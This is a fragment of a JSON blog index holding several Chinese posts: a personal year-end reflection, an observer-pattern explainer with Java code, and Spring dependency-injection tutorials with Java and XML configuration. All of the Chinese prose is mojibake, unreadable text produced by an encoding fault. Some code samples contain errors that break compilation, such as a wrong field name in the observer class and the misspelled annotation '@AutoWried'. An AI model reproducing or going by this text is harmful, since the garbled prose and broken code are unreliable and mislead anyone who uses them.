åšå®¢ä¹Ÿä¼šå‘å¸ƒåœ¨åšå®¢å›­ï¼Œåšå®¢å›­çš„åšå®¢éƒ½ä¼šæ˜¯éå¸¸è®¤çœŸçš„ï¼Œè€Œä¸åƒcsdnä¸€æ ·æ‚ä¹±å…·ä½“ä»£ç ï¼šhttps://github.com/pompeii666/proxy è¿™ç¯‡åšå®¢è€—æ—¶ï¼Œä¸€å‘¨ï¼Œæ–­æ–­ç»­ç»­ï¼Œç™½å¤©å·¥ä½œå›æ¥ï¼Œåƒä¸ªé¥­ï¼Œæ´—ä¸ªæ¾¡ï¼Œå°±æƒ³ç¡è§‰ã€‚","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"å¹´å‰çš„æ„Ÿæƒ³","slug":"å¹´å‰çš„æ„Ÿæƒ³","date":"2018-12-07T06:00:48.000Z","updated":"2020-11-14T17:11:10.274Z","comments":true,"path":"2018/12/07/å¹´å‰çš„æ„Ÿæƒ³/","link":"","permalink":"http://yoursite.com/2018/12/07/%E5%B9%B4%E5%89%8D%E7%9A%84%E6%84%9F%E6%83%B3/","excerpt":"","text":"ä»Šå¹´å’Œå¾€å¹´ä¸ä¸€æ ·ï¼Œç®—æ˜¯äººç”Ÿçš„å˜åŒ–å§ã€‚ä¸ŠåŠå¹´3æœˆåˆ°7æœˆä¸€ç›´åœ¨æ— é”¡å®è®­ï¼Œä¹‹åå°±æ˜¯ç»å†é¢è¯•å…¬å¸ï¼Œä¹Ÿç®—æ˜¯ç¬¬ä¸€æ¬¡ä½“éªŒåˆ°ç¤¾ä¼šçš„æ ·å­ã€‚åæ¥æ¥åˆ°äº†äºšä¿¡ï¼Œå…¬å¸æ˜¯çœŸçš„å¤§ï¼Œåœ¨æˆ‘çœ‹æ¥ã€‚åˆšåˆ°è¿™ï¼Œå°±æ„Ÿè§‰åˆ°å¤§å…¬å¸çš„åšäº‹ï¼Œæµ‹è¯•å¼€å‘è¿ç»´ã€‚è¿›çš„ç»„ä¹Ÿéå¸¸å¥½ï¼Œæ¯å‘¨éƒ½æœ‰å¥¶èŒ¶å–ï¼Œæ¯å‘¨äºŒæ™šä¸Šæœ‰çŸ¥è¯†åŸ¹è®­ï¼Œä¸€èˆ¬æ˜¯è½®æ¢äººå»è®²ã€‚ç°åœ¨æƒ³æƒ³ï¼Œå¦‚æœè¿™ä¸ªç»„æ˜¯åœ¨åˆ«çš„å…¬å¸å°±å¥½äº†ï¼Œè¿™æ ·çš„æ°›å›´çœŸçš„å¥½ï¼Œå‰å‡ å¤©ç¦»èŒï¼Œæ­£èµ¶ä¸Šèšé¤ï¼Œé‚£å¤©å–äº†ä¸€æ¯ã€‚ ç°åœ¨å°±åœ¨æ‰¾å·¥ä½œï¼Œæ˜¨å¤©å»é¢è¯•äº†ä¸€å®¶ï¼Œå¾ˆå°ä½†æ˜¯å·¥èµ„è¿˜ä¸é”™ï¼Œå¸Œæœ›èƒ½è¿‡ã€‚æˆ‘è§‰å¾—ä¸€ä¸ªäººçš„æˆåŠŸï¼Œéœ€è¦ç»è¿‡å¾ˆå¤šå†ç»ƒ","categories":[],"tags":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"è®¾è®¡æ¨¡å¼ä¹‹ç¦…-è§‚å¯Ÿè€…æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼ä¹‹ç¦…-è§‚å¯Ÿè€…æ¨¡å¼","date":"2018-10-25T07:23:57.000Z","updated":"2020-11-14T17:11:11.095Z","comments":true,"path":"2018/10/25/è®¾è®¡æ¨¡å¼ä¹‹ç¦…-è§‚å¯Ÿè€…æ¨¡å¼/","link":"","permalink":"http://yoursite.com/2018/10/25/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰ **ä¹Ÿå«åš å‘å¸ƒè®¢é˜…æ¨¡å¼ **(Publish/subscribe),å®ƒæ˜¯åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ç»å¸¸ä½¿ç”¨çš„æ¨¡å¼ï¼Œå®šä¹‰å¦‚ä¸‹ï¼šDefine a one-to-mang dependency between objects so that when one objectchanges state,all its dependents are notified and updated automaticallyï¼ˆå®šä¹‰å¯¹è±¡é—´ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œä½¿å¾—æ¯å½“ä¸€ä¸ªå¯¹è±¡æ”¹å˜çŠ¶æ€ï¼Œåˆ™æ‰€æœ‰ä¾èµ–äºå®ƒçš„å¯¹è±¡éƒ½ä¼šå¾—åˆ°é€šçŸ¥å¹¶è¢«è‡ªåŠ¨æ›´æ–°ã€‚ï¼‰ Subjectï¼šè¢«è§‚å¯Ÿè€… å®šä¹‰è¢«è§‚å¯Ÿè€…å¿…é¡»å®ç°çš„èŒè´£ï¼Œå®ƒå¿…é¡»èƒ½å¤ŸåŠ¨æ€æ·»åŠ ã€åˆ é™¤è§‚å¯Ÿè€…ã€‚å®ƒä¸€èˆ¬æ˜¯æŠ½è±¡ç±»æˆ–è€…å®ç°ç±»ï¼Œä»…ä»…å®Œæˆä½œä¸ºè¢«è§‚å¯Ÿè€…å¿…é¡»å®ç°çš„èŒè´£ï¼šç®¡ç†è§‚å¯Ÿè€…å¹¶é€šçŸ¥è§‚å¯Ÿè€…ï¼ˆnotifyObserversï¼‰ Observerè§‚å¯Ÿè€… è§‚å¯Ÿè€…æ”¶åˆ°ä¿¡æ¯åï¼Œå³è¿›è¡Œupdateæ“ä½œï¼Œå¯¹æ¥æ”¶çš„ä¿¡æ¯è¿›è¡Œå¤„ç† è§‚å¯Ÿè€…æ˜¯è¢«è¢«è§‚å¯Ÿè€…ç®¡ç†çš„ ConcreteSubjectå…·ä½“çš„è¢«è§‚å¯Ÿè€… å®šä¹‰è¢«è§‚å¯Ÿè€…è‡ªå·±çš„ä¸šåŠ¡é€»è¾‘ï¼ŒåŒæ—¶å®šä¹‰å¯¹å“ªäº›æ—¶é—´è¿›è¡Œé€šçŸ¥ã€‚ ConcreteObserverå…·ä½“çš„è§‚å¯Ÿè€… æ¯ä¸ªè§‚å¯Ÿè€…åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯åå¤„ç†ååº”æ˜¯ä¸åŒï¼Œå„ä¸ªè§‚å¯Ÿè€…æœ‰è‡ªå·±çš„å¤„ç†é€»è¾‘ã€‚ è¢«è§‚å¯Ÿè€…æŠ½è±¡æ¥å£public interface Observable { //æ·»åŠ ä¸€ä¸ªè§‚å¯Ÿè€… public void addObserver(Observer observer); //åˆ é™¤ä¸€ä¸ªè§‚å¯Ÿè€… public void deleteObserver(Observer observer); //é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€… public void notifyObservers(String context); }å…·ä½“å®ç°ç±» public class Subject implements Observable{ //å®šä¹‰ä¸€ä¸ªè§‚å¯Ÿè€…æ•°ç»„ private Vector&lt;Observer&gt; obsverVector = new Vector&lt;Observer&gt;(); //æ·»åŠ ä¸€ä¸ªè§‚å¯Ÿè€… public void addObserver(Observer observer){ obsver.add(observer)ï¼› } //åˆ é™¤ä¸€ä¸ªè§‚å¯Ÿè€… public void deleteObserver(Observer observer){ obsverVector.remove(obserber); } //é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€… public void notifyObservers(String context){ for(Observer o : obsverVector){ o.update(context); } } //ä¸šåŠ¡é€»è¾‘ï¼Œdosomethingæ—¶é€šçŸ¥æ‰€æœ‰åœ¨æ•°ç»„ä¸­çš„è§‚å¯Ÿè€… public void dosomething(){ /** dosth */ notifyObservers(&quot;dosth&quot;); } }è§‚å¯Ÿè€…æ¥å£public interface Observer { //æ ¹æ®è¢«è§‚å¯Ÿè€…æ¨é€çš„ä¿¡æ¯ï¼Œè§‚å¯Ÿè€…è¿›è¡Œæ›´æ–°ä¿¡æ¯ public void update(String context); }å…·ä½“çš„clientä¸­è¯´ä¸‹æ€è·¯ å…ˆå»ºç«‹subjectå®ä¾‹ ç„¶åå»ºç«‹ä¸åŒçš„è§‚å¯Ÿè€…å®ä¾‹ subjecté‡Œé¢æ·»åŠ ä¸åŒçš„è§‚å¯Ÿè€…å®ä¾‹ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åˆ é™¤ï¼‰ åœ¨subjectæ›´æ–°äº‹ä»¶çš„æ—¶å€™ï¼ˆå¯ä»¥é€šçŸ¥è§‚å¯Ÿè€…ï¼‰ä¼˜ç‚¹ è§‚å¯Ÿè€…å’Œè¢«è§‚å¯Ÿè€…ä¹‹é—´æ˜¯æŠ½è±¡è€¦åˆ(å¢åŠ è§‚å¯Ÿè€…è¿˜æ˜¯è¢«è§‚å¯Ÿè€…éƒ½éå¸¸å®¹æ˜“æ‰©å±•) å»ºç«‹ä¸€å¥—è§¦å‘æœºåˆ¶ï¼ˆè¢«è§‚å¯Ÿè€…æ”¹å˜ï¼Œè§¦å‘å¯¼è‡´è§‚å¯Ÿè€…å‘ç”Ÿå˜åŒ–ï¼‰ ç¼ºç‚¹ è§‚å¯Ÿè€…æ¨¡å¼éœ€è¦è€ƒè™‘å¼€å‘æ•ˆç‡å’Œè¿è¡Œæ•ˆç‡ï¼Œä¸€ä¸ªè¢«è§‚å¯Ÿè€…ï¼Œå¤šä¸ªè§‚å¯Ÿè€…ã€‚å¼€å‘å’Œè°ƒè¯•æ¯”è¾ƒå¤æ‚ï¼Œè€Œä¸”javaä¸­æ¶ˆæ¯é€šçŸ¥æ˜¯é¡ºåºæ‰§è¡Œï¼Œä¸€ä¸ªè§‚å¯Ÿè€…å¡å£³æˆ–è€…æŒ‚äº†ï¼Œä¼šå½±å“æ•´ä½“çš„æ‰§è¡Œæ•ˆç‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€èˆ¬è€ƒè™‘é‡‡ç”¨å¼‚æ­¥çš„æ–¹å¼ã€‚ å¼‚æ­¥å¤„ç†é—®é¢˜å¼‚æ­¥å¤„ç†å°±è¦è€ƒè™‘çº¿ç¨‹å®‰å…¨å’Œé˜Ÿåˆ—çš„é—®é¢˜ï¼Œè¿˜æ˜¯çœ‹ä¸€çœ‹Message Queue,ä¼šæœ‰æ›´æ·±çš„äº†è§£ã€‚ï¼ˆä½œè€…è¡¨ç¤ºï¼šæ²¡çœ‹è¿‡ï¼Œä»¥åå†çœ‹ï¼‰","categories":[],"tags":[{"name":"è®¾è®¡æ¨¡å¼ä¹‹ç¦…","slug":"è®¾è®¡æ¨¡å¼ä¹‹ç¦…","permalink":"http://yoursite.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85/"},{"name":"è§‚å¯Ÿè€…æ¨¡å¼","slug":"è§‚å¯Ÿè€…æ¨¡å¼","permalink":"http://yoursite.com/tags/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/"}]},{"title":"springä¾èµ–æ³¨å…¥ï¼ˆäºŒï¼‰-javaæ³¨å…¥ï¼Œxmlæ³¨å…¥ï¼Œæ··åˆæ³¨å…¥","slug":"springä¾èµ–æ³¨å…¥ï¼ˆäºŒï¼‰-javaæ³¨å…¥ï¼Œxmlæ³¨å…¥ï¼Œæ··åˆæ³¨å…¥","date":"2018-10-22T09:41:00.000Z","updated":"2020-11-14T17:11:11.597Z","comments":true,"path":"2018/10/22/springä¾èµ–æ³¨å…¥ï¼ˆäºŒï¼‰-javaæ³¨å…¥ï¼Œxmlæ³¨å…¥ï¼Œæ··åˆæ³¨å…¥/","link":"","permalink":"http://yoursite.com/2018/10/22/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89-java%E6%B3%A8%E5%85%A5%EF%BC%8Cxml%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%B7%B7%E5%90%88%E6%B3%A8%E5%85%A5/","excerpt":"","text":"javaæ³¨å…¥ @Configuration public class CDPlayerConfig { @Bean public CompactDisc compactDisc(){ return new SgtPeppers(); } @Bean public CDPlayer cdPlayer(CompactDisc cd){ return new CDPlayer(cd); } }åœ¨æµ‹è¯•ç±»ä¸­ @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(classes = CDPlayerConfig.class)//æ­¤å¤„ç”¨è¿™æ ·çš„ï¼Œå½“ç„¶ï¼Œclassesæ˜¯å¯ä»¥å†™å¤šä¸ª public class CDPlsyerTest { @Autowired private MediaPlayer player; @Test public void play(){ player.play(); } }xmlæ³¨å…¥é¦–å…ˆäº†è§£ï¼šcå‘½åç©ºé—´ ç®€åŒ– æ„é€ å™¨ çš„å±æ€§èµ‹å€¼på‘½åç©ºé—´ ç®€åŒ– setæ–¹æ³• çš„å±æ€§èµ‹å€¼ 1.ç®€å•ç‰ˆï¼šç¬¬ä¸€ç§ï¼šæ„é€ å™¨æ³¨å…¥ &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.collections.BlankDisc&quot;&gt; &lt;constructor-arg value=&quot;Sgt. Pepper&apos;s Lonely Hearts Club Band&quot;/&gt; &lt;constructor-arg value=&quot;The Beatles&quot;/&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friend&lt;/value&gt; &lt;value&gt;Lucy in the sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s leaving Home&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.CDPlayer&quot;&gt; &lt;constructor-arg ref=&quot;compactDisc&quot;/&gt;//refæ˜¯å¼•ç”¨ &lt;/bean&gt;ç¬¬äºŒç§ï¼šsetæ–¹æ³•æ³¨å…¥ &lt;bean id=&quot;compactDisc&quot; class=&quot;soundsystem.properties.BlankDisc&quot;&gt; &lt;property name=&quot;title&quot; value=&quot;Sgt. Pepper&apos;s Lonely Hearts Club Band&quot; /&gt; &lt;property name=&quot;artist&quot; value=&quot;The Beatles&quot; /&gt; &lt;property name=&quot;tracks&quot;&gt; &lt;list&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friends&lt;/value&gt; &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt; &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt; &lt;value&gt;Within You Without You&lt;/value&gt; &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt; &lt;value&gt;Lovely Rita&lt;/value&gt; &lt;value&gt;Good Morning Good Morning&lt;/value&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt; &lt;value&gt;A Day in the Life&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt;2.ç®€åŒ–ç‰ˆï¼šæ„é€ å™¨cå‘½åç©ºé—´ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:c=&quot;http://www.springframework.org/schema/c&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;cd&quot; class=&quot;com.husky.spring.BlankDisc&quot; c:_0=&quot;Sgt. pepper&apos;s lonely Hearts Club band&quot; c:_1=&quot;The Beatles&quot;/&gt; &lt;bean id=&quot;cdplayer&quot; class=&quot;com.husky.spring.CDPlayer&quot; c:cd-ref=&quot;cd&quot;/&gt; &lt;/beans&gt;è®°å¾—åœ¨beansé‡Œé¢å¯¼å…¥ xmlns:c=â€œ http://www.springframework.org/schema/c â€setæ–¹æ³•på‘½åç©ºé—´ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.properties.BlankDisc&quot; p:title=&quot;Sgt. pepper&apos;s Lonely Hearts Club Band&quot; p:artist=&quot;The Beatles&quot;&gt; &lt;property name=&quot;tracks&quot;&gt; &lt;list&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friends&lt;/value&gt; &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt; &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt; &lt;value&gt;Within You Without You&lt;/value&gt; &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt; &lt;value&gt;Lovely Rita&lt;/value&gt; &lt;value&gt;Good Morning Good Morning&lt;/value&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt; &lt;value&gt;A Day in the Life&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.properties.CDPlayer&quot; p:compactDisc-ref=&quot;compactDisc&quot;/&gt; &lt;/beans&gt;è®°å¾—å¯¼å…¥xmlns:p=â€œ http://www.springframework.org/schema/p â€é›†åˆï¼šutilå‘½åç©ºé—´ _springçš„é…ç½®æ–‡ä»¶ä¸­utilå‘½åç©ºé—´ç±»ä¼¼äºjava.utilåŒ…ç±»å¯¹åº”ï¼Œutilå‘½åç©ºé—´æä¾›äº†é›†åˆç›¸å…³çš„é…ç½® _ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xmlns:util=&quot;http://www.springframework.org/schema/util&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd&quot;&gt; &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.properties.BlankDisc&quot; p:title=&quot;sgt. Pepper&apos;s Lonely Hearts Club Band&quot; p:artist=&quot;The Peppers&quot; p:tracks-ref=&quot;trackList&quot;/&gt; &lt;util:list id=&quot;trackList&quot;&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band&lt;/value&gt; &lt;value&gt;With a Little Help from My Friends&lt;/value&gt; &lt;value&gt;Lucy in the Sky with Diamonds&lt;/value&gt; &lt;value&gt;Getting Better&lt;/value&gt; &lt;value&gt;Fixing a Hole&lt;/value&gt; &lt;value&gt;She&apos;s Leaving Home&lt;/value&gt; &lt;value&gt;Being for the Benefit of Mr. Kite!&lt;/value&gt; &lt;value&gt;Within You Without You&lt;/value&gt; &lt;value&gt;When I&apos;m Sixty-Four&lt;/value&gt; &lt;value&gt;Lovely Rita&lt;/value&gt; &lt;value&gt;Good Morning Good Morning&lt;/value&gt; &lt;value&gt;Sgt. Pepper&apos;s Lonely Hearts Club Band (Reprise)&lt;/value&gt; &lt;value&gt;A Day in the Life&lt;/value&gt; &lt;/util:list&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.properties.CDPlayer&quot; p:compactDisc-ref=&quot;compactDisc&quot;/&gt; &lt;/beans&gt;æ··åˆæ³¨å…¥1.åœ¨xmlä¸­å¯¼å…¥javaconfig @Configuration public class CDPlayerConfig { @Bean public CDPlayer cdPlayer(CompactDisc compactDisc){ return new CDPlayer(compactDisc); } } &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:c=&quot;http://www.springframework.org/schema/c&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean class=&quot;com.husky.spring.CDConfig&quot;/&gt; &lt;bean id=&quot;cdPlayer&quot; class=&quot;com.husky.spring.CDPlayer&quot; c:cd-ref=&quot;compactDisc&quot;/&gt; &lt;/beans&gt;ä¹Ÿå°±æ˜¯åœ¨xmlä¸­ç›´æ¥å°†è¿™ä¸ªjavaconfigç›´æ¥æ³¨å†Œæˆbean2.åœ¨javaä¸­æ³¨å…¥xmlconfigxmlconfig &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:c=&quot;http://www.springframework.org/schema/c&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;compactDisc&quot; class=&quot;com.husky.spring.BlankDisc&quot; c:_0=&quot;Sgt. perpper&apos;s Lonely Hearts Club band&quot; c:_1=&quot;The beatles&quot;&gt; &lt;/bean&gt; &lt;/beans&gt; package com.husky.spring; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; /** * @author husky * @date 2018/10/22 15:25 */ @Configuration public class CDConfig { @Bean public CompactDisc compactDisc(){ return new SgtPeppers(); } } @Configuration @Import(CDPlayerConfig.class) @ImportResource(locations = {&quot;classpath:cd-config.xml&quot;}) public class SoundSystemConfig { }é€šè¿‡importæ¥å¯¼å…¥è¿›æ¥ å…·ä½“æºç  javaconfig [ xmlconfig ](https://github.com/pompeii666/learnspring/tree/master/husky-xmlconfig)[ mixedconfig ](https://github.com/pompeii666/learnspring/tree/master/husky-mixedconfig)","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"springä¾èµ–æ³¨å…¥ï¼ˆ1ï¼‰-è‡ªåŠ¨æ³¨å…¥","slug":"springä¾èµ–æ³¨å…¥ï¼ˆ1ï¼‰-è‡ªåŠ¨æ³¨å…¥","date":"2018-10-17T09:59:08.000Z","updated":"2020-11-14T17:11:12.083Z","comments":true,"path":"2018/10/17/springä¾èµ–æ³¨å…¥ï¼ˆ1ï¼‰-è‡ªåŠ¨æ³¨å…¥/","link":"","permalink":"http://yoursite.com/2018/10/17/spring%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/","excerpt":"","text":"åœ¨éœ€è¦æ·»åŠ è‡ªåŠ¨æ³¨å…¥çš„ç±»åŠ å…¥æ³¨è§£@Componentåœ¨ç±»ä¸­ï¼Œå¦‚æœéœ€è¦æ³¨å…¥åˆ«çš„ç±»ï¼Œè¿™ä¸ªæ—¶å€™å£°æ˜åˆ«çš„ç±»ï¼Œç„¶åæ·»åŠ @AutoWriedå…·ä½“ä¾‹å­ @Component public class CDPlayer implements MediaPlayer { @AutoWried private CompactDisc cd; @Override public void play() { cd.play(); } }ç³»ç»Ÿåœ¨æ‰«ææ—¶ï¼Œå‘ç°@Componentæ³¨è§£ä¼šå°†CDPlayeræ”¾å…¥åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œè€Œåœ¨æ‰«æåˆ°@AutoWriedæ—¶ï¼Œä¼šå°†åº”ç”¨ä¸Šä¸‹æ–‡ä¸­çš„ComPactDiscæ³¨å…¥åˆ°é‡Œé¢ *springå½“ä¸­é…ç½®åˆ†ä¸ºï¼šjavaConfigå’Œxmlè€Œåœ¨javaConfig * @Configuration @ComponentScan public class CDPlayerConfig { }æ­¤å¤„ä½¿ç”¨@CompontScanæ³¨è§£ï¼Œä¼šå»å¯»æ‰¾å½“å‰CDPlayeræ‰€åœ¨ä½ç½®çš„åŒ…é‡Œé¢çš„å„ä¸ªç±»ï¼Œå¹¶è¿›è¡Œæ³¨è§£æ‰«æï¼Œå½“ç„¶CDPlayerConfigä¹Ÿè¢«æ‰«æåˆ°äº†ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†@Configurationæ³¨è§£ã€‚ã€‚å½“ç„¶@CompontScanä¹Ÿå¯ä»¥è®¾ç½®æ‰«æå…·ä½“çš„åŒ…ï¼Œå¯ä»¥æ³¨è§£é‡Œé¢æ·»åŠ é…ç½®ï¼ˆå…·ä½“é‡åˆ°å†è¯´ï¼‰ xmlé…ç½® &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;context:component-scan base-package=&quot;com.husky.spring&quot;/&gt; &lt;/beans&gt;å…·ä½“æµ‹è¯•çš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ³¨è§£@ContextConfiguration(classes=CDPlayerConfig.class)æˆ–è€…@ContextConfiguration(locations = â€œclasspath:spring/soundsystem.xmlâ€) /** * @author husky * @date 2018/10/17 16:31 */ @RunWith(SpringJUnit4ClassRunner.class) @ContextConfiguration(classes=CDPlayerConfig.class) public class CDPlayerJavaConfigTest { @Rule public final StandardOutputStreamLog log = new StandardOutputStreamLog(); @Autowired private MediaPlayer player; @Autowired private CompactDisc cd; @Test public void cdShouldNotBeNull(){ assertNotNull(cd); } @Test public void play(){ player.play(); assertEquals(&quot;Playing Sgt . Pepper&apos;s Lonely Hearts Club Band by The Beatles\\n&quot;,log.getLog()); } }å…·ä½“autoconfigåœ¨ github","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"springä»‹ç»","slug":"springä»‹ç»","date":"2018-10-17T09:27:53.000Z","updated":"2020-11-14T17:11:12.585Z","comments":true,"path":"2018/10/17/springä»‹ç»/","link":"","permalink":"http://yoursite.com/2018/10/17/spring%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"Springæœ€æ ¹æœ¬çš„ä½¿å‘½ç®€åŒ–javaå¼€å‘ åŸºäºPOJOçš„è½»é‡çº§å’Œæœ€å°ä¾µå…¥æ€§ç¼–ç¨‹ é€šè¿‡ä¾èµ–æ³¨å…¥å’Œé¢å‘æ¥å£å®ç°æ¾è€¦åˆ åŸºäºåˆ‡é¢å’Œæƒ¯ä¾‹è¿›è¡Œå£°æ˜å¼ç¼–ç¨‹ é€šè¿‡åˆ‡é¢å’Œæ¨¡æ¿å‡å°‘æ ·æ¿å¼ä»£ç  POJOï¼šPlain Ordinary Java Object ç®€å•çš„javaå¯¹è±¡ï¼Œæ˜¯æŒ‡é‚£äº›æ²¡æœ‰ç»§æ‰¿ä»»ä½•ç±»ã€ä¹Ÿæ²¡æœ‰è¢«å…¶ä»–æ¡†æ¶ä¾µå…¥çš„javaå¯¹è±¡ã€‚å½“ç„¶ä¸€äº›ç±»å®ç°äº†Serializableæ¥å£ï¼ŒCloneableæ¥å£ã€ã€ç­‰ç­‰éƒ½ç®—æ˜¯POJOä¸ºä»€ä¹ˆä¼šæœ‰POJOå‘¢ï¼Œå°±ä»¥æˆ‘ä»¬å…¬å¸çš„ä¾‹å­ä¸ºä¾‹ï¼ŒjavaBeané‡Œé¢æ˜¯ååˆ†å¤æ‚çš„ã€‚è¿˜æœ‰å¬å‰è¾ˆè¯´ä»€ä¹ˆEJBçš„ç¹æ‚ã€‚äºæ˜¯å›å½’çº¯æ´è€å¼çš„JavaBeanï¼Œå³æœ‰æ— æ„é€ 